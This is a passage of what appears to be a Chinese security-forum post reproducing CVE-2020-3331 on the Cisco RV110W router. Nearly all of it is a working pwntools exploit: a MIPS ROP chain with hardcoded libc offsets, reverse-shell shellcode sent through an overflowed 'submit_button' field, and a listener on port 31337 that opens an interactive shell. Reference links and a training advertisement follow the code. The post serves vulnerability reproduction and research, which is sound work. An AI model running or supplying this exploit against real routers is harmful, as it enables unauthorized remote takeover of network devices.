
```python
from pwn import *
import thread,requests
context(arch='mips',endian='little',os='linux')
io = listen(31337)
libc = 0x2af98000
jmp_a0 = libc + 0x0003D050  # move  $t9,$a0 ; jalr  $a0
jmp_s0 = libc + 0x000257A0  # addiu $a0,$sp,0x38+var_20 ; jalr  $s0
shellcode = "\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28"
shellcode += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
shellcode += "\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01"
shellcode += "\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01"
shellcode += "\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24"
shellcode += "\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20"
shellcode += "\xf8\xff\xa5\xaf\x01\x64\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf"
shellcode += "\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24"
shellcode += "\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf"
shellcode += "\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28"
shellcode += "\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23"
shellcode += "\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28"
shellcode += "\xab\x0f\x02\x24\x0c\x09\x09\x01"
payload = "status_guestnet.asp" + 'a'*49 + p32(jmp_a0) + 0x20*'a' + p32(jmp_s0) + 0x18*'a' + shellcode
paramsPost = {"cmac":"12:af:aa:bb:cc:dd","submit_button":payload,"cip":"192.168.1.100"}

def attack():
    try:
        requests.post("eddK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1j5I4z5e0u0Q4x3X3f1I4y4U0S2Q4x3X3f1I4i4K6u0W2x3g2)9J5c8X3N6#2k6i4y4@1i4K6g2X3L8r3!0Y4L8%4g2@1i4K6u0W2j5$3N6A6", data=paramsPost, verify=False,timeout=1)
    except:
        pass

thread.start_new_thread(attack,())
io.wait_for_connection()
log.success("getshell")
io.interactive()
```

参考链接

[1]：[思科路由器 RV110W CVE-2020-3331 漏洞复现 | Clang裁缝店 (xuanxuanblingbling.github.io)](https://bbs.kanxue.com/elink@90cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5N6h3q4F1P5s2g2S2L8X3u0D9K9h3&6Y4j5X3I4A6L8X3N6Q4x3X3g2Y4K9i4c8Z5N6h3u0Q4x3X3g2A6L8#2)9J5c8X3W2G2N6q4)9J5c8U0t1H3x3U0m8Q4x3V1j5I4x3q4)9J5c8U0t1$3i4K6u0r3M7Y4j5I4x3e0m8%4i4K6u0r3)

[2]：[[原创]思科RV110W CVE-2020-3331漏洞调试与iot靶场搭建-智能设备-看雪论坛-安全社区|安全招聘|bbs.pediy.com](https://bbs.pediy.com/thread-266357.htm#msg_header_h2_2)

[3]：[HWS赛题 入门 MIPS Pwn | Clang裁缝店 (xuanxuanblingbling.github.io)](https://bbs.kanxue.com/elink@d8fK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6^5N6h3q4F1P5s2g2S2L8X3u0D9K9h3&6Y4j5X3I4A6L8X3N6Q4x3X3g2Y4K9i4c8Z5N6h3u0Q4x3X3g2A6L8#2)9J5c8X3y4@1k6W2)9J5c8Y4m8%4L8W2)9J5c8U0t1H3x3U0m8Q4x3V1j5H3z5g2)9J5c8U0t1@1i4K6u0r3L8h3W2H3M7#2)9J5c8R3`.`.)

[4]：[IoT-vulhub/Cisco/CVE-2020-3331 at master · firmianay/IoT-vulhub (github.com)](https://bbs.kanxue.com/elink@9feK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6X3K9i4u0E0K9h3q4F1j5i4W2Q4x3V1k6u0L8#2c8Q4x3X3c8$3N6h3I4Z5N6h3u0Q4x3V1k6@1M7X3g2W2i4K6u0r3L8h3q4K6N6r3g2J5i4K6u0r3b7$3W2K6j5$3!0Q4x3V1k6o6g2V1g2Q4x3X3b7J5x3o6t1H3i4K6u0V1x3K6x3K6x3b7`.`.)

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于 2022-3-17 15:10

被N1ptune编辑，原因：修改错误
